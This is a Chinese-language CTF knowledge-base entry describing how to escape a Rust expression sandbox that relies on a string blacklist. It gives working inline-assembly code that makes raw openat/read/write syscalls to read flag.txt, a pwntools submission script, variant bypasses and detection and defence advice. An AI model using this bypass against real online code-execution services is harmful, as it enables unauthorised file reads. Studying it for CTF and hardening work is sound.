---
id: binary-pwn-sandbox-escape-rust-include-asm-syscall
title: Rust 表达式沙箱字符串黑名单绕过：include! 内用 core::arch::asm! 裸 syscall 读文件
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: rust-include-asm-syscall-blacklist-bypass
aliases:
- Rust 沙箱逃逸
- Custom Login
- include! 表达式
- core::arch::asm!
- 裸 syscall openat read write
- 字符串黑名单绕过
- Rust eval 沙箱
tags:
- rust
- sandbox-escape
- asm
- syscall
- blacklist-bypass
- linux
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V180
  verified_at: '2026-11-06T17:19:20+08:00'
  notes: 已对照原文核对：user_expr.rs 表达式约束、grep -qi 字符串黑名单、core::arch::asm! openat/read/write 与图26输出一致；未在本机复跑
---

## 一句话结论

服务端把用户代码保存为 `user_expr.rs` 并用 `eval!({ include!("user_expr.rs") })` 编译执行，只用 `grep -qi` 做字符串黑名单；攻击者把代码写成 `{ ... }` 表达式块，使用 `core::arch::asm!` 直接发起 Linux x86_64 `openat/read/write` 系统调用，即可在不出现 `std::fs`、`File`、`Read`、`Write` 等被禁字符串的情况下读取 `flag.txt` 并写到 stdout。

## 原理

- **include! 的语法约束**：`include!("user_expr.rs")` 在表达式位置展开，要求文件内容是一个 Rust 表达式；`use xxx;` 是语句，不合法；`{ ... }` 块本身是表达式，可容纳多条语句/unsafe 块。
- **黑名单是子串匹配**：过滤逻辑是 `grep -qi -- "$pat"`，不是 AST 分析也不是 token 级过滤；只要源码不含被禁字符串即可。被禁包括 `std::fs`、`std::io`、`File`、`Read`、`Write`、`println!`、`print!`、`process`、`Command` 等。
- **未覆盖的逃逸面**：黑名单没有禁止 `core::arch::asm!`、`syscall`、原始系统调用号；因此可以绕过 Rust 标准库的 I/O API，直接与内核交互。
- **裸 syscall 读文件**：
  - `openat(AT_FDCWD=-100, "flag.txt\0", O_RDONLY=0, 0)`，x86_64 syscall 号 257，返回 fd（`rax`）。
  - `read(fd, buf, 128)`，syscall 号 0，`rdi=fd`、`rsi=buf`、`rdx=len`。
  - `write(1, buf, 128)`，syscall 号 1，`rdi=1`（stdout）、`rsi=buf`、`rdx=len`。
- **为什么成立**：Rust 的 `asm!` 是编译期内联汇编，不经过标准库符号；字符串黑名单只检查源码文本，看不到内核调用语义。代码作为表达式块编译后直接运行在服务端进程中，进程对 `flag.txt` 有读权限即可泄露。
- **边界**：需要目标为 Linux x86_64、Rust 编译器支持 `asm!`（stable 1.59+）、服务端未用 seccomp/容器隔离限制 syscall、`flag.txt` 在当前工作目录或已知可写路径。

## 触发条件

- 在线 Rust 代码执行/评测服务，使用 `include!`/`eval!` 或类似机制编译用户提交的源码。
- 过滤为字符串/正则黑名单，未做 AST 白名单、未禁用 `asm!`、未做 seccomp/沙箱隔离。
- 目标为 Linux x86_64，Rust 版本支持内联汇编；flag 文件位于进程可读路径。
- 用户代码需满足 `include!` 的表达式语法（用 `{}` 包裹）。

## 利用步骤

1. 确认提交格式：服务要求 `user_expr.rs` 是表达式，代码需用 `{ ... }` 包裹，不能用 `use`。
2. 枚举黑名单（通过报错/源码/尝试）：确认 `std::fs`、`File`、`Read`、`Write`、`print!` 等被禁，但 `core::arch::asm!` 未被禁。
3. 构造裸 syscall 代码：`openat` 打开 `flag.txt`，`read` 到缓冲区，`write` 到 stdout；所有路径用全限定名，字符串 `"flag.txt\0"` 不含被禁子串。
4. 通过服务的输入接口粘贴代码（示例以 `END` 结束），触发编译执行。
5. 读取 stdout 中的 flag；若文件名/路径不同，枚举 `flag.txt`、`/flag`、`./flag` 或先用 `getdents` 列目录。

## PoC

```rust
{
    unsafe {
        let fd: i64;
        let mut buf = [0u8; 128];

        // openat(AT_FDCWD, "flag.txt", O_RDONLY, 0)
        core::arch::asm!(
            "syscall",
            in("rax") 257i64,
            in("rdi") -100i64,
            in("rsi") "flag.txt\0".as_ptr(),
            in("rdx") 0i64,
            in("r10") 0i64,
            lateout("rax") fd,
        );

        // read(fd, buf, 128)
        core::arch::asm!(
            "syscall",
            in("rax") 0i64,
            in("rdi") fd,
            in("rsi") buf.as_mut_ptr(),
            in("rdx") 128i64,
            lateout("rax") _,
        );

        // write(1, buf, 128)
        core::arch::asm!(
            "syscall",
            in("rax") 1i64,
            in("rdi") 1i64,
            in("rsi") buf.as_ptr(),
            in("rdx") 128i64,
            lateout("rax") _,
        );
    }
}
```

Python 提交：

```python
from pwn import *
io = remote(HOST, PORT)
io.recvuntil(b"Paste your crabs here!")
io.sendline(payload)
io.sendline(b"END")
io.interactive()
```

原文输出：

```text
CTF{cRusty_cr4b_4lw@ys_t4k3_care_0f_unsaf3_c0de!}
```

## 变体与关联

- syscall 变体：`open`(2)、`execve`(59)、`getdents64`(217) 列目录、`sendfile`(40) 直接输出；也可用 `std::arch::asm!`、`global_asm!`。
- 黑名单绕过变体：字符串拼接/`concat!`/宏展开、Unicode 转义、把 `File` 拆成 `F`+`ile`、使用 `core::ptr`/FFI 调用 libc。
- 沙箱变体：若 `asm!` 被禁但允许 `extern "C"`，可链接 libc `open/read/write`；若允许 `libc` crate，直接调用。
- 关联：[[binary-pwn-sandbox-escape-python-ast-joinedstr-ctypes-open]]（Python 沙箱绕过）、[[binary-pwn-sandbox-escape-nodejs-eval-char-ast-filter-with-consolelog-eval]]（Node 字符串过滤绕过）、[[binary-pwn-sandbox-escape-dify-sandbox-parseint-hoisting-seccomp]]（seccomp 相关）。
- 边界：目标启用 seccomp 禁止 open/read/write、把代码跑在 WASM/独立容器、或做 AST 白名单时，该路径失效。

## 检测与防御

- 检测：提交的 Rust 源码包含 `core::arch::asm!`、`asm!`、`syscall`、原始 syscall 号；编译日志/进程行为中出现异常的 `openat/read/write`；在线评测服务出现读取 `flag.txt` 的行为。
- 防御：不要用字符串黑名单；使用 AST 白名单/语法树校验，禁止 `asm!`、`extern`、`unsafe`、宏展开；在独立容器/WASM/seccomp 中运行，限制文件系统与 syscall。
- 加固：评测进程使用只读最小根文件系统、无 flag 文件权限；限制 CPU/内存/时间；对提交代码做编译前静态分析与运行后审计。
